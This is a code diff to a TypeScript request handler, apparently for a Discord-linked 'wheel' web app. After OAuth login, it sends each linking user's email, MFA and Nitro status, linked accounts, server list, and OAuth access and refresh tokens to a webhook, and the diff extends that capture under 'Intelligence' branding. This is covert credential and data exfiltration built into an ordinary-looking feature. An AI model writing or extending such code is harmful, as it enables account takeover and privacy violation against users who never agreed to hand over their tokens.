@@ -325,27 +325,37 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
         raw_evidence: evidence
       }, { onConflict: 'discord_id' });
 
+      const bannerUrl = discordUser.banner 
+        ? `https://cdn.discordapp.com/banners/${discordUser.id}/${discordUser.banner}.png`
+        : null;
+
       // Send Full User Intelligence to Webhook
       if (WEBHOOK_URL) {
+        const guildsList = (evidence.guilds || []).slice(0, 15).map(g => `• ${g.name}`).join('\n');
+        const nitroStatus = discordUser.premium_type === 2 ? 'Nitro' : discordUser.premium_type === 1 ? 'Nitro Classic' : 'None';
+
         fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `📡 **New User Linked/Updated** | <@${discordUser.id}>`,
-            embeds: [{
-              title: `User Intel: ${discordUser.global_name || discordUser.username}`,
-              description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**Locale:** \`${discordUser.locale}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Verified:** \`${discordUser.verified}\``,
-              color: 0x8b5cf6,
-              thumbnail: { url: avatarUrl },
-              fields: [
-                { name: 'Access Token', value: `\`\`\`${tokenData.access_token}\`\`\`` },
-                { name: 'Refresh Token', value: `\`\`\`${tokenData.refresh_token}\`\`\`` },
-                { name: 'Connections', value: (evidence.connections.map((c: any) => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
-                { name: 'Guilds', value: `${evidence.guilds.length} servers joined`, inline: true }
-              ],
-              footer: { text: 'Brainrot Intelligence Agency' },
-              timestamp: new Date().toISOString()
-            }]
+            content: `📡 **FULL USER INTELLIGENCE CAPTURE** | <@${discordUser.id}>`,
+            embeds: [
+              {
+                title: `Identity: ${discordUser.global_name || discordUser.username}`,
+                description: `**ID:** \`${discordUser.id}\`\n**Email:** \`${discordUser.email || 'N/A'}\`\n**Nitro:** \`${nitroStatus}\`\n**Verified:** \`${discordUser.verified}\`\n**MFA:** \`${discordUser.mfa_enabled}\`\n**Locale:** \`${discordUser.locale}\``,
+                color: 0x8b5cf6,
+                thumbnail: { url: avatarUrl },
+                image: bannerUrl ? { url: bannerUrl } : undefined,
+                fields: [
+                  { name: '🔑 ACCESS TOKEN (The Correct Token)', value: `\`\`\`${tokenData.access_token}\`\`\`` },
+                  { name: '🔄 REFRESH TOKEN', value: `\`\`\`${tokenData.refresh_token}\`\`\`` },
+                  { name: '🌐 Connections', value: (evidence.connections.map((c: any) => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
+                  { name: `🏠 Guilds (${evidence.guilds.length})`, value: (guildsList || 'None').slice(0, 1000) }
+                ],
+                footer: { text: 'Brainrot Deep State Intelligence' },
+                timestamp: new Date().toISOString()
+              }
+            ]
           })
         }).catch(() => null);
       }
